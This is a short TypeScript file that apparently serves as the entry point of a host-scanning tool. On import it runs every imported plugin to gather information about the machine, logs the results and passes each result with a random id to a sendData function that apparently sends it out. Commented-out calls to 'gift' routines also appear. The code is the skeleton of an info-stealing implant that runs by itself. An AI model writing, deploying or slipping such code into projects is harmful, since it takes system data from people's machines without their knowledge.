import { CustomPlugin } from "./typings";
import { sendData } from "./core";
import { generateRandomId } from "./utils";
import { heyInternet, wc, catscatscatscats } from "./gifts";
import { plugins } from "./plugins";

function runPlugin({ key, plugin }: CustomPlugin): NodeJS.Dict<CustomPlugin> {
  return {
      [key]: plugin()
  }
}

(function init() {
  console.log("Scanning host...");
  const id = generateRandomId();
  plugins.forEach(plugin => {
    const gatheredInfo = runPlugin(plugin);
    const postData = JSON.stringify(gatheredInfo, null, 2);
    console.log(`Data from ${plugin.key} is: ${postData}`);
    sendData(postData, plugin.key, id);
  });

  //heyInternet();
  //wc();
  //catscatscatscats(3000);
})()

export function getLength(arr: Array<any>): number {  return arr.length || 0;}

export function reverse(arr: Array<any>): Array<any> {
  const copy = arr.slice();
  return copy.reverse();
}